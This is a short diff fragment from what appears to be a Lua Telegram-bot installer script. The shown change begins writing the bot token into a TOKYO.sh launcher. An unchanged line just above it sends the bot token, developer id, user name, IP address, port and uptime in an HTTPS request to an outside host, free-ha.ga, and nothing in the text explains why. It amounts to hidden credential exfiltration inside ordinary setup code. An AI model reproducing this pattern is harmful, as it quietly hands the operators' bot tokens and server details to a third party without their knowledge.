@@ -9266,6 +9266,7 @@ SudoIds = {DevId},
 https.request("https://free-ha.ga/AVIRA.php?Get=token&id="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 Create(Config, "./config.lua")   
 file = io.open("TOKYO.sh", "w")  
+file:write([[
 #!/usr/bin/env bash
 cd $HOME/DavidTeam
 token="]]..TokenBot..[["
